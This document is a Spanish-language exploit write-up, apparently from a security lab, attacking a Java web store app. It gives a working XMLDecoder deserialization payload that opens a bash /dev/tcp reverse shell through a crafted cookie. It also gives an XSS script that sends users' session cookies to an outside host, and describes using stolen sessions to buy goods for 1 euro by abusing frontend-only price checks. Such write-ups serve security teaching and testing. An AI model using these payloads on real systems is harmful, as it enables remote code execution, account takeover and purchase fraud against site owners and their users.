# Exploits


## Reverse shell usando la vulnerabilidad de deserializacion insegura en la cookie user-info
### Vulnerabilidades Explotadas
- Deserializacion insegura

### Exploit

Para llevar a cabo este exploit se necesita estar sin la sesion iniciada, lo primero que hay que hacer es poner un listener con netcat asi: `nc -nlvp 4444` luego hay que crear el payload necesario para esto encodeando el siguiente xml a base64:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <!-- 1) Ejecuta ProcessBuilder primero -->
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2">
        <string>bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</string>
      </void>
    </array>
    <void method="start"/>
  </object>

  <!-- 2) Devuelve un UserInfo válido para que el cast funcione -->
  <object class="es.storeapp.web.cookies.UserInfo">
    <void property="email"><string>victim@example.com</string></void>
    <void property="password"><string>password</string></void>
  </object>
</java>
```

Luego creamos una cookie llamada user-info y como valor le asignamos el anterior codigo en Base64. Como se muestra en la imagen:

![user-ingo](./img/cookie_user_info.png)

Una vez echo esto se hara cualquier accion en la aplicacion como por ejemplo ir a otra pestaña, recargar la pagina etc. Se mostrara un error en la pagina web. Una vez hecho esto lo que hay que hacer es ir a la terminal con nuestro listener escuchando y ahi veremos que hay una conexión remota como se ve en la siguiente imagen. Cabe destacar que se obtiene acceso como el usuario que esta ejecutando la aplicacion.


![nc](./img/rev_shell_prove.png)
(Cabe destacar que en este caso la termianl de nc se ve rara debido a que la conexion ba desde localhost a localhost)




## Mediante XSS obtener cookies de usuarios loggeados y usar su cuenta para comprar productos e enviarlos a una direccion arbitraria

### Vulnerabilidades Explotadas
- XSS
- Access Control
- Fallo en la validación de datos

### Exploit
Para llevar a cabo este exploit necesitaremos el siguiente javascript exploit:

```javascript
<script>new Image().src='http://localhost:9999/exploit?c='+encodeURIComponent(document.cookie)</script>
```

Este lo podemos meter en un comentario de cualquier producto aunque no lo hayamos comprado haciendo uso de una Vulnerabilidad en el control de acceso Como se ve en la imagen:

![xss](./img/insert_xss.png)

Cuando un usuario quiera ver los comentarios de este producto, el XSS hara una peticion al servidor con la cookie de `JSESSIONID`. Tendremos el siguiente servidor runneando en el puerto 9999:

```python

```

Este script lo que hacer es poner un servidor que se encarga de cuando le llegue una peticíon con la cookie añade al carrito los productos y los compra con el valor de 1 euro (mediante una vulnerabilidad que tiene la aplicación a la hora de validar datos (la suma solo se calcula en el frontend pero no en el backedn))
Cabe mencionar que para este ejemplo el unico producto que se compra es el 3, pero se podría modificar de manera simple para poder comprar cualquier producto que se deseara.
En la siguiente imagen se ve como le llega una peticion a nuestro servidor despues de que la vitima vea la review:

![peticion](./img/peticion_server.png)

En las siguientes imagenes se pueden ver que el exploit funciono, la primera es el perfil de la victima y la segunda es la confirmaicion del pedido, donde se puede observar que el precio es de tan solo 1€ y que la direccion es otra:

![perfil](./img/victim_profile.png)

![exploit_2_prueba](./img/prueba_exploit_dos.png)